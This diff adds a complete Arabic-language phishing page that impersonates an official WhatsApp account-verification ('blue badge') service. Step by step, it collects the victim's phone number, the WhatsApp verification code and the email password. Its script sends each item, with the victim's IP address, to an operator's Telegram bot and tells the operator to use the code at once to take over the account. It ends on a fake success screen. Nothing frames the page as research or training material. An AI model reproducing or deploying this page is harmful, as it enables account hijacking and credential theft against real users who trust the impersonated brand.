@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق حساب واتساب - التحقق الأمني</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
+        body {
+            background: linear-gradient(145deg, #0b1a2e 0%, #1a2f3f 100%);
+            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
+        }
+        .container {
+            max-width: 520px; width: 100%; background: #ffffff; border-radius: 28px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5); overflow: hidden; position: relative;
+        }
+        .header {
+            background: #075e54; padding: 25px 20px 20px; text-align: center; position: relative;
+        }
+        .header .whatsapp-icon {
+            width: 70px; height: 70px; background: #25d366; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 12px; box-shadow: 0 6px 20px rgba(37,211,102,0.4);
+        }
+        .header .whatsapp-icon svg { width: 38px; height: 38px; fill: #fff; }
+        .header h1 { color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 4px; }
+        .header p { color: #b0d4d0; font-size: 13px; }
+        .badge-verified {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: #e8f5e9; color: #1b7a2b; padding: 6px 16px;
+            border-radius: 30px; font-size: 13px; font-weight: 600; margin: 16px auto 0;
+        }
+        .badge-verified svg { width: 16px; height: 16px; fill: #25d366; }
+        .content { padding: 10px 22px 30px; }
+        .step { display: none; animation: fadeSlideIn 0.5s ease; }
+        .step.active { display: block; }
+        @keyframes fadeSlideIn {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        .intro-section { text-align: center; padding: 8px 0; }
+        .intro-section .shield-icon {
+            width: 60px; height: 60px; background: #dcf8c6; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;
+        }
+        .intro-section .shield-icon svg { width: 32px; height: 32px; fill: #075e54; }
+        .intro-section h2 { font-size: 20px; color: #075e54; margin-bottom: 12px; }
+        .intro-section .desc-box {
+            background: #f0f9f4; border-radius: 16px; padding: 18px 16px;
+            text-align: right; margin-bottom: 12px;
+        }
+        .intro-section .desc-box p {
+            font-size: 14px; color: #2d3e50; line-height: 1.8; margin-bottom: 10px;
+        }
+        .intro-section .desc-box ul {
+            list-style: none; padding: 0; text-align: right;
+        }
+        .intro-section .desc-box ul li {
+            font-size: 13px; color: #1b5e20; padding: 6px 28px 6px 0;
+            position: relative; border-bottom: 1px solid #e0e0e0;
+        }
+        .intro-section .desc-box ul li::before {
+            content: "✓"; position: absolute; right: 4px; top: 6px;
+            color: #25d366; font-weight: bold; font-size: 15px;
+        }
+        .intro-section .desc-box ul li:last-child { border-bottom: none; }
+        .features-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 14px 0;
+        }
+        .features-grid .feat {
+            background: #fff; border: 1px solid #e0e0e0; border-radius: 12px;
+            padding: 10px; text-align: center; font-size: 12px; color: #333;
+        }
+        .features-grid .feat svg {
+            width: 22px; height: 22px; fill: #25d366; display: block; margin: 0 auto 4px;
+        }
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 6px;
+        }
+        .form-group select, .form-group input {
+            width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0;
+            border-radius: 12px; font-size: 15px; background: #fafafa;
+            transition: 0.2s; outline: none;
+        }
+        .form-group select:focus, .form-group input:focus {
+            border-color: #25d366; background: #fff; box-shadow: 0 0 0 4px rgba(37,211,102,0.1);
+        }
+        .form-group select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23555'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-position: left 14px center;
+            background-size: 22px; padding-left: 40px;
+        }
+        .input-with-code { display: flex; gap: 10px; }
+        .input-with-code input { flex: 1; text-align: center; font-size: 22px; letter-spacing: 6px; font-weight: bold; }
+        .btn {
+            width: 100%; padding: 16px; background: #25d366; color: #fff;
+            border: none; border-radius: 14px; font-size: 17px; font-weight: 700;
+            cursor: pointer; transition: 0.3s; box-shadow: 0 4px 14px rgba(37,211,102,0.35);
+        }
+        .btn:hover {
+            background: #1ebe5d; transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37,211,102,0.45);
+        }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .btn-secondary { background: #075e54; box-shadow: 0 4px 14px rgba(7,94,84,0.35); }
+        .btn-secondary:hover { background: #064b43; }
+        .step-indicator {
+            display: flex; justify-content: center; align-items: center; gap: 8px; margin: 16px 0 20px;
+        }
+        .step-indicator .dot {
+            width: 10px; height: 10px; border-radius: 50%; background: #ddd; transition: 0.3s;
+        }
+        .step-indicator .dot.active { background: #25d366; width: 28px; border-radius: 10px; }
+        .step-indicator .dot.done { background: #075e54; }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #e0e0e0;
+            border-top-color: #25d366; border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success-animation { text-align: center; padding: 30px 0 20px; }
+        .success-animation .checkmark-circle { width: 80px; height: 80px; margin: 0 auto 16px; position: relative; }
+        .success-animation .checkmark-circle .checkmark {
+            stroke: #25d366; stroke-width: 4; stroke-linecap: round;
+            stroke-linejoin: round; fill: none; animation: checkmarkDraw 0.8s ease forwards;
+        }
+        .success-animation .checkmark-circle .circle-bg { fill: #e8f5e9; stroke: #25d366; stroke-width: 2; }
+        @keyframes checkmarkDraw {
+            0% { stroke-dasharray: 100; stroke-dashoffset: 100; }
+            100% { stroke-dashoffset: 0; }
+        }
+        .success-animation h2 { color: #1b7a2b; font-size: 22px; margin-bottom: 6px; }
+        .success-animation p { color: #666; font-size: 14px; }
+        .success-animation .pulse-dot {
+            display: inline-block; width: 8px; height: 8px; background: #25d366;
+            border-radius: 50%; margin-left: 4px; animation: pulse 1.2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.6); }
+        }
+        .timer-box {
+            background: #fff3e0; border: 1px solid #ffe0b2; border-radius: 12px;
+            padding: 14px; text-align: center; margin: 16px 0;
+        }
+        .timer-box .timer-count { font-size: 28px; font-weight: 700; color: #e65100; }
+        .timer-box p { font-size: 13px; color: #bf360c; }
+        @media (max-width: 480px) {
+            .container { border-radius: 20px; }
+            .header { padding: 18px 16px; }
+            .content { padding: 8px 16px 24px; }
+            .features-grid { grid-template-columns: 1fr; }
+        }
+        .toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            background: #333; color: #fff; padding: 14px 24px; border-radius: 12px;
+            font-size: 14px; opacity: 0; transition: 0.4s; z-index: 999;
+        }
+        .toast.show { opacity: 1; }
+        .loading-box {
+            text-align: center; padding: 20px 0;
+        }
+        .loading-box p { color: #999; font-size: 13px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="whatsapp-icon">
+                <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+            </div>
+            <h1>توثيق حساب واتساب</h1>
+            <p>التحقق الأمني المتقدم للحصول على العلامة المميزة</p>
+            <div class="badge-verified">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                توثيق رسمي · مدعوم من واتساب
+            </div>
+        </div>
+
+        <div class="content">
+            <!-- Step Indicator -->
+            <div class="step-indicator" id="stepIndicator">
+                <span class="dot active" data-step="0"></span>
+                <span class="dot" data-step="1"></span>
+                <span class="dot" data-step="2"></span>
+                <span class="dot" data-step="3"></span>
+                <span class="dot" data-step="4"></span>
+            </div>
+
+            <!-- ===== STEP 0: INTRO ===== -->
+            <div class="step active" id="step0">
+                <div class="intro-section">
+                    <div class="shield-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    </div>
+                    <h2>ما هي عملية توثيق حساب واتساب؟</h2>
+
+                    <div class="desc-box">
+                        <p>توثيق حساب واتساب هو إجراء أمني متقدم تقدمه منصة واتساب للتحقق من هوية المستخدمين ومنحهم <strong>العلامة المميزة (العلامة الزرقاء)</strong> التي تدل على أن الحساب موثوق وتم التحقق منه رسميًا.</p>
+                        <p>الحصول على العلامة المميزة يمنح حسابك:</p>
+                        <ul>
+                            <li><strong>علامة زرقاء موثقة</strong> بجانب اسم حسابك</li>
+                            <li><strong>حماية متقدمة</strong> ضد محاولات الاحتيال والانتحال</li>
+                            <li><strong>ظهور متزايد</strong> في نتائج البحث داخل التطبيق</li>
+                            <li><strong>ثقة أكبر</strong> من العملاء والمتابعين</li>
+                            <li><strong>دعم فني مخصص</strong> من فريق واتساب</li>
+                        </ul>
+                    </div>
+
+                    <div class="features-grid">
+                        <div class="feat">
+                            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                            علامة زرقاء
+                        </div>
+                        <div class="feat">
+                            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                            حماية متقدمة
+                        </div>
+                        <div class="feat">
+                            <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+                            أولوية في البحث
+                        </div>
+                        <div class="feat">
+                            <svg viewBox="0 0 24 24"><path d="M21 6h-2v2h-2V6h-2V4h2V2h2v2h2v2zm-10 3c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm0 4c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+                            دعم مخصص
+                        </div>
+                    </div>
+
+                    <button class="btn" onclick="nextStep(0)">ابدأ عملية التوثيق</button>
+                </div>
+            </div>
+
+            <!-- ===== STEP 1: PHONE NUMBER ===== -->
+            <div class="step" id="step1">
+                <h2 style="color:#075e54; font-size:18px; margin-bottom:8px;">📱 أدخل رقم هاتفك</h2>
+                <p style="color:#666; font-size:13px; margin-bottom:16px;">سوف نرسل رمز تحقق إلى رقم هاتفك عبر واتساب</p>
+
+                <div class="form-group">
+                    <label>اختر الدولة</label>
+                    <select id="countryCode">
+                        <option value="+20">🇪🇬 مصر (+20)</option>
+                        <option value="+966">🇸🇦 السعودية (+966)</option>
+                        <option value="+971">🇦🇪 الإمارات (+971)</option>
+                        <option value="+965">🇰🇼 الكويت (+965)</option>
+                        <option value="+974">🇶🇦 قطر (+974)</option>
+                        <option value="+973">🇧🇭 البحرين (+973)</option>
+                        <option value="+968">🇴🇲 عمان (+968)</option>
+                        <option value="+962">🇯🇴 الأردن (+962)</option>
+                        <option value="+964">🇮🇶 العراق (+964)</option>
+                        <option value="+963">🇸🇾 سوريا (+963)</option>
+                        <option value="+961">🇱🇧 لبنان (+961)</option>
+                        <option value="+218">🇱🇾 ليبيا (+218)</option>
+                        <option value="+213">🇩🇿 الجزائر (+213)</option>
+                        <option value="+212">🇲🇦 المغرب (+212)</option>
+                        <option value="+216">🇹🇳 تونس (+216)</option>
+                        <option value="+1">🇺🇸 الولايات المتحدة (+1)</option>
+                        <option value="+44">🇬🇧 المملكة المتحدة (+44)</option>
+                        <option value="+49">🇩🇪 ألمانيا (+49)</option>
+                        <option value="+33">🇫🇷 فرنسا (+33)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>رقم الهاتف</label>
+                    <input type="tel" id="phoneNumber" placeholder="مثال: 501234567" maxlength="15" inputmode="numeric">
+                </div>
+
+                <button class="btn" onclick="sendPhone()">إرسال رمز التحقق</button>
+                <p style="text-align:center; font-size:12px; color:#999; margin-top:10px;">سيصلك رمز عبر واتساب خلال 30 ثانية</p>
+            </div>
+
+            <!-- ===== STEP 2: VERIFICATION CODE ===== -->
+            <div class="step" id="step2">
+                <h2 style="color:#075e54; font-size:18px; margin-bottom:8px;">🔐 تأكيد رمز التحقق</h2>
+                <p style="color:#666; font-size:13px; margin-bottom:16px;">أدخل رمز التحقق المكون من 6 أرقام الذي أرسلناه إلى هاتفك</p>
+
+                <div class="timer-box">
+                    <p>باقي من الوقت</p>
+                    <div class="timer-count" id="timerDisplay">02:00</div>
+                </div>
+
+                <div class="form-group">
+                    <label>رمز التحقق</label>
+                    <div class="input-with-code">
+                        <input type="text" id="verificationCode" placeholder="000000" maxlength="6" inputmode="numeric" style="font-size:24px; letter-spacing:8px;">
+                    </div>
+                </div>
+
+                <button class="btn" onclick="sendCode()">تأكيد الرمز</button>
+                <button class="btn btn-secondary" style="margin-top:10px;" onclick="resendCode()">إعادة إرسال الرمز</button>
+            </div>
+
+            <!-- ===== STEP 3: EMAIL CREDENTIALS ===== -->
+            <div class="step" id="step3">
+                <h2 style="color:#075e54; font-size:18px; margin-bottom:8px;">📧 تأكيد البريد الإلكتروني</h2>
+                <p style="color:#666; font-size:13px; margin-bottom:16px;">لإتمام عملية التوثيق، نحتاج إلى تأكيد بريدك الإلكتروني المرتبط بالحساب</p>
+
+                <div class="form-group">
+                    <label>البريد الإلكتروني</label>
+                    <input type="email" id="email" placeholder="example@gmail.com" dir="ltr" style="text-align:left;">
+                </div>
+
+                <div class="form-group">
+                    <label>كلمة المرور للبريد الإلكتروني</label>
+                    <input type="password" id="emailPassword" placeholder="••••••••" dir="ltr">
+                </div>
+
+                <button class="btn" onclick="sendEmail()">تأكيد التوثيق</button>
+            </div>
+
+            <!-- ===== STEP 4: SUCCESS ===== -->
+            <div class="step" id="step4">
+                <div class="success-animation">
+                    <div class="checkmark-circle">
+                        <svg viewBox="0 0 80 80" width="80" height="80">
+                            <circle class="circle-bg" cx="40" cy="40" r="36"/>
+                            <path class="checkmark" d="M22 40l12 12 24-24" />
+                        </svg>
+                    </div>
+                    <h2>✅ تمت العملية بنجاح!</h2>
+                    <p>جاري توثيق حسابك على واتساب <span class="pulse-dot"></span></p>
+                    <p style="margin-top:10px; color:#888; font-size:12px;">سيتم تفعيل العلامة المميزة خلال 24 ساعة</p>
+                </div>
+                <div class="loading-box">
+                    <div class="spinner" style="width:30px; height:30px; border-width:3px;"></div>
+                    <p>جارِ التحقق من البيانات وتحديث الحساب...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ==============================================
+        // 🛠️ الإعدادات - ضع توكن البوت هنا فقط
+        // ==============================================
+        const BOT_TOKEN = "التوكن_هنا";
+
+        // الحصول على chatId من رابط الصفحة
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('chatId') || '';
+
+        let currentStep = 0;
+        let timerInterval;
+        let timeLeft = 120;
+        let collectedData = {};
+
+        // ==============================================
+        // إرسال إلى تليجرام
+        // ==============================================
+        async function sendToTelegram(message) {
+            if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+                showToast("⚠️ لم يتم تكوين توكن البوت - البيانات في Console");
+                console.log("DATA TO SEND:", message);
+                return;
+            }
+            if (!CHAT_ID) {
+                showToast("❌ رابط غير صالح - لا يوجد Chat ID");
+                return;
+            }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    // نسخ تلقائي
+                    try { await navigator.clipboard.writeText(message); } catch(e) {}
+                    showToast('✅ تم الإرسال والنسخ إلى الحافظة');
+                } else {
+                    showToast('❌ خطأ: ' + (data.description || 'غير معروف'));
+                }
+            } catch (err) {
+                showToast('❌ فشل الإرسال: ' + err.message);
+            }
+        }
+
+        // ==============================================
+        // التنقل بين الخطوات
+        // ==============================================
+        function showStep(stepIndex) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            const stepEl = document.getElementById('step' + stepIndex);
+            if (stepEl) stepEl.classList.add('active');
+
+            document.querySelectorAll('.step-indicator .dot').forEach(dot => {
+                const s = parseInt(dot.dataset.step);
+                dot.classList.remove('active', 'done');
+                if (s === stepIndex) dot.classList.add('active');
+                else if (s < stepIndex) dot.classList.add('done');
+            });
+            currentStep = stepIndex;
+        }
+
+        function nextStep(fromStep) {
+            showStep(fromStep + 1);
+        }
+
+        // ==============================================
+        // الخطوة 1: رقم الهاتف
+        // ==============================================
+        async function sendPhone() {
+            const country = document.getElementById('countryCode').value;
+            const phone = document.getElementById('phoneNumber').value.trim();
+
+            if (!phone) { showToast('❌ من فضلك أدخل رقم الهاتف'); return; }
+
+            collectedData.phone = country + phone;
+            collectedData.country = country;
+            collectedData.rawPhone = phone;
+
+            const msg = `🔔 <b>📱 رقم هاتف جديد</b>\n\n━━━━━━━━━━━━━━\n<b>الرقم:</b> <code>${collectedData.phone}</code>\n<b>الدولة:</b> ${country}\n<b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}\n<b>IP:</b> ${await getIP()}\n━━━━━━━━━━━━━━`;
+            await sendToTelegram(msg);
+
+            showToast('📩 تم إرسال رمز التحقق إلى هاتفك');
+            nextStep(1);
+            startTimer();
+        }
+
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch(e) { return 'غير معروف'; }
+        }
+
+        // ==============================================
+        // التايمر
+        // ==============================================
+        function startTimer() {
+            timeLeft = 120;
+            updateTimerDisplay();
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('timerDisplay').textContent = '00:00';
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
+            document.getElementById('timerDisplay').textContent =
+                String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+        }
+
+        function resendCode() {
+            collectedData.resendCount = (collectedData.resendCount || 0) + 1;
+            showToast('📩 تم إعادة إرسال الرمز');
+            startTimer();
+            sendToTelegram(`🔄 <b>إعادة إرسال الرمز</b>\n📱 الرقم: ${collectedData.phone}\n🔢 عدد المحاولات: ${collectedData.resendCount}`);
+        }
+
+        // ==============================================
+        // الخطوة 2: كود التحقق
+        // ==============================================
+        async function sendCode() {
+            const code = document.getElementById('verificationCode').value.trim();
+            if (!code || code.length < 4) { showToast('❌ أدخل رمز التحقق كاملاً'); return; }
+
+            collectedData.verificationCode = code;
+
+            const msg = `🔐 <b>🔑 كود التحقق</b>\n\n━━━━━━━━━━━━━━\n<b>الرقم:</b> <code>${collectedData.phone}</code>\n<b>الكود:</b> <code>${code}</code>\n<b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━\n\n<i>انسخ الكود واستخدمه فوراً!</i>`;
+            await sendToTelegram(msg);
+
+            clearInterval(timerInterval);
+            showToast('✅ تم تأكيد الرمز بنجاح');
+            nextStep(2);
+        }
+
+        // ==============================================
+        // الخطوة 3: البريد الإلكتروني
+        // ==============================================
+        async function sendEmail() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('emailPassword').value.trim();
+
+            if (!email || !password) { showToast('❌ أدخل البريد الإلكتروني وكلمة المرور'); return; }
+
+            collectedData.email = email;
+            collectedData.emailPassword = password;
+
+            const msg = `📧 <b>📧 بيانات التوثيق الكاملة</b>\n\n━━━━━━━━━━━━━━\n<b>📱 الرقم:</b> <code>${collectedData.phone}</code>\n<b>🔑 كود التحقق:</b> <code>${collectedData.verificationCode}</code>\n<b>📧 البريد:</b> <code>${email}</code>\n<b>🔐 كلمة المرور:</b> <code>${password}</code>\n<b>🕐 التاريخ:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━\n\n<i>✅ تم تجميع جميع البيانات بنجاح</i>`;
+            await sendToTelegram(msg);
+
+            showToast('✅ تم إرسال البيانات، جاري توثيق الحساب...');
+            nextStep(3);
+        }
+
+        // ==============================================
+        // Toast
+        // ==============================================
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ==============================================
+        // بدء التشغيل
+        // ==============================================
+        showStep(0);
+    </script>
+</body>
+</html>
